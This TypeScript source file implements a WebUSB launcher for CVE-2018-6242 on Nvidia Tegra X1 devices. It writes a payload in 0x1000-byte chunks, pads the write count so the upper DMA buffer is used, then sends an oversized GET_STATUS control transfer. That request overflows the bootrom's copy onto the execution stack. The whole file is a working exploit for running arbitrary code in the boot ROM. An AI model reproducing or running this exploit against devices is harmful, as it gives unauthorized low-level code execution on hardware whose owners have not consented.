import Payload from '../payloads/Payload';

/**
 * Represents a Nvidia Tegra X1 based device vulnerable to CVE-2018-6242.
 */
export default class TegraDevice {
  /**
   * The USBDevice object used to talk to the Tegra.
   */
  private device: USBDevice;

  /**
   * Creates an instance of a TegraDevice using a provided USBDevice. Used by
   * factory methods.
   * 
   * @param device The USBDevice to create this TegraDevice from.
   */
  protected constructor(device: USBDevice) {
    this.device = device;
  }

  /**
   * Launches a payload.
   *
   * @param payload Payload to be launched.
   */
  public async launch(payload: Payload) {
    // Write the payload to the switch.
    const writeCount = await this.write(payload.getBytes());

    // Make sure the number of 0x1000 byte blocks sent to the device is odd, so
    // the upper DMA buffer is used.
    if (writeCount % 2 !== 1) {
      await this.device.transferOut(1, new ArrayBuffer(0x1000));
    }

    // Trigger the vulnerability.
    await this.triggerVuln();
  }

  /**
   * Write a payload to the device.
   * 
   * @param data The payload to write.
   * @return The number of packets that were written.
   */
  private async write(data: Uint8Array): Promise<number> {
    // The number of bytes stored in each packet.
    const PACKET_SIZE = 0x1000;
    
    // Number for storing the number of packets that were written.
    let writeCount = 0;

    // Number for storing the number of bytes remaining in the payload.
    let length = data.length;

    // Send all of the data in the payload to the device.
    while (length) {
      // Calculate the amount of data in the next packet.
      const dataToTransmit = Math.min(length, PACKET_SIZE);
      length -= dataToTransmit;

      // Pop the data from the payload.
      const chunk = data.slice(0, dataToTransmit);
      data = data.slice(dataToTransmit);

      // Send the data to the device.
      await this.device.transferOut(1, chunk);

      // Increment the count of packets.
      writeCount++;
    }

    // Return the number of packets that were sent to the device.
    return writeCount;
  }

  /**
   * Triggers CVE-2018-6242. When the device copies the memory for its 
   * status, it doesn't check the length of our request, so it ends up
   * copying the data from our payload on top of the execution stack.
   */
  private async triggerVuln() {
    // The length for the GET_STATUS request. Significantly larger than what
    // should be expected from a GET_STATUS response.
    const vulnLength = 0x7000;

    // Send a GET_STATUS request to the device with the specified
    // vulnerability length.
    // eslint-disable-next-line
    const smash = await this.device.controlTransferIn({
      requestType: 'standard',
      recipient: 'interface',
      request: 0x00,
      value: 0x00,
      index: 0x00
    }, vulnLength);
  }

  /**
   * Factory method for creating a new TegraDevice.
   * 
   * @param vendorId The Vendor ID of the Nvidia Tegra X1 based device.
   */
  public static async requestDevice(vendorId: number): Promise<TegraDevice> {
    // Create the USBDevice for this TegraDevice.
    let device: USBDevice;

    // Try to request the device from the user.
    try {
      device = await navigator.usb.requestDevice({
          filters: [{ vendorId: vendorId }]});
    } catch (error) {
      throw new Error("Error selecting USB device: " + error);
    }

    // Initialize the device.
    await device.open();

    if (device.configuration === null) {
      await device.selectConfiguration(1);
    }

    await device.claimInterface(0);

    // Get the device ID.
    // eslint-disable-next-line
    const deviceID = await device.transferIn(1, 16);

    // Return the TegraDevice.
    return new TegraDevice(device);
  }
}
